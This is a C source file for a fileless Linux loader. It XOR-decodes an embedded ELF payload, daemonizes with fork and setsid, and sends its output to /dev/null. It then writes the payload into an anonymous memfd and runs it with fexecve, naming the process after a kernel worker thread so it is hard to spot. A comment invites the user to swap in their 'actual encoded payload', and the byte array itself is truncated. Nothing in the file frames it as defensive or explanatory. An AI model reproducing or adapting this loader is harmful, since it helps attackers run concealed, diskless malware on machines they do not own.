#define _GNU_SOURCE
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>

int main() {
    unsigned char input_elf[] = {
        // XOR-encoded ELF bytecode for a "Hello World" program
        // Replace with your actual encoded payload
        0x18, 0x22, 0x2b, 0x21, 0x65, 0x66, 0x66, 0x67, 
        0x67, 0x67, 0x67, 0x67, 0x67, 0x67, 0x67, 0x67, 
        // ... (rest of the encoded ELF data)
    };
    size_t elf_size = sizeof(input_elf);

    // Decode the data using XOR key 0x67
    for (size_t i = 0; i < elf_size; i++) {
        input_elf[i] ^= 0x67;
    }

    // Fork a new process
    pid_t pid = fork();
    if (pid < 0) {
        perror("fork");
        exit(EXIT_FAILURE);
    }

    if (pid > 0) {
        // Parent process: exit immediately to detach from the child
        exit(EXIT_SUCCESS);
    }

    // Child process: detach from the parent
    if (setsid() < 0) { // Create a new session
        perror("setsid");
        exit(EXIT_FAILURE);
    }

    // Optionally, redirect standard input, output, and error to /dev/null
    int dev_null = open("/dev/null", O_RDWR);
    if (dev_null < 0) {
        perror("open /dev/null");
        exit(EXIT_FAILURE);
    }
    dup2(dev_null, STDIN_FILENO);
    dup2(dev_null, STDOUT_FILENO);
    dup2(dev_null, STDERR_FILENO);
    close(dev_null);

    // Create an anonymous in-memory file
    int fd = memfd_create(" \\_ [kworker/1:1-events]", MFD_CLOEXEC);
    if (fd == -1) {
        perror("memfd_create");
        exit(EXIT_FAILURE);
    }

    // Write the ELF binary to the in-memory file
    if (write(fd, input_elf, elf_size) == -1) {
        perror("write");
        close(fd);
        exit(EXIT_FAILURE);
    }

    // Reset the file offset to the beginning
    if (lseek(fd, 0, SEEK_SET) == -1) {
        perror("lseek");
        close(fd);
        exit(EXIT_FAILURE);
    }

    // Execute the ELF binary using fexecve
    char *const argv[] = {" \\_ [kworker/1:1-events]", NULL};
    char *const envp[] = {NULL};
    if (fexecve(fd, argv, envp) == -1) {
        perror("fexecve");
        close(fd);
        exit(EXIT_FAILURE);
    }

    // Clean-up (unreachable if fexecve succeeds)
    close(fd);

    return 0;
}
